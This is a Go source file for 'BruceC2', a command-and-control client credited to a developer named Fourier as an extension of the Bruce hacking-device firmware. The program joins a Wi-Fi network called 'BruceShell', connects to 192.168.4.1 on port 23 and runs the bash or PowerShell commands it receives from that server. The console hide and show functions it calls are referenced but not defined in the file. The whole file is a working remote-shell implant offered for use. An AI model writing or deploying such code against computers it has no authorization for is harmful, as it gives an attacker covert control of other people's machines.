package main

//
// BruceC2
// Developed by Fourier (github.com/9dl)
// Use Bruce to connect to BruceShell
// BruceC2 is an extension for Bruce
// Bruce: github.com/pr3y/bruce
//

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func connectToWiFi(ssid string) error {
	switch runtime.GOOS {
	case "windows":
		return exec.Command("netsh", "wlan", "connect", "name="+ssid).Run()
	case "darwin", "linux":
		return exec.Command("nmcli", "d", "wifi", "connect", ssid).Run()
	default:
		return fmt.Errorf("unsupported platform")
	}
}

func isConnectedToWiFi(ssid string) bool {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("netsh", "wlan", "show", "interfaces")
	case "darwin", "linux":
		cmd = exec.Command("nmcli", "-t", "-f", "active,ssid", "dev", "wifi")
	default:
		return false
	}
	output, err := cmd.Output()
	return err == nil && strings.Contains(string(output), ssid)
}

func main() {
	ssid := "BruceShell"
	if connectToWiFi(ssid) != nil {
		fmt.Println("Error connecting to Wi-Fi")
		return
	}

	for i := 0; i < 10; i++ {
		if isConnectedToWiFi(ssid) {
			fmt.Println("Connected to Wi-Fi!")
			break
		}
		time.Sleep(time.Second)
	}

	conn, err := net.Dial("tcp", "192.168.4.1:23")
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to BruceShell.")
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		if !strings.HasPrefix(scanner.Text(), "~") { // ~ = Not a command
			fmt.Println("BruceShell@Server:", scanner.Text())
			commandRunner(strings.TrimPrefix(scanner.Text(), "~"))
		} else {
			fmt.Println("BruceShell@Server:", strings.Replace(scanner.Text(), "~", "", 1))
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Connection error:", err)
	}
}

func commandRunner(command string) {
	switch {
	case command == "exit":
		fmt.Println("Exiting...")
		os.Exit(0)

	case command == "clear":
		runCommand("clear", nil)
		return

	case strings.HasPrefix(command, "B:"): // Bash command
		runCommand("bash", []string{"-c", strings.TrimPrefix(command, "B:")})
		return

	case strings.HasPrefix(command, "PS:"): // PowerShell command
		runCommand("powershell", []string{"-Command", strings.TrimPrefix(command, "PS:")})
		return

	case command == "showConsole":
		showConsole()
		return

	case command == "hideConsole":
		hideConsole()
		return

	default:
		fmt.Println("Unknown command:", command)
	}
}

func runCommand(name string, args []string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		//fmt.Printf("Error executing %s: %v\n", name, err)
	}
}
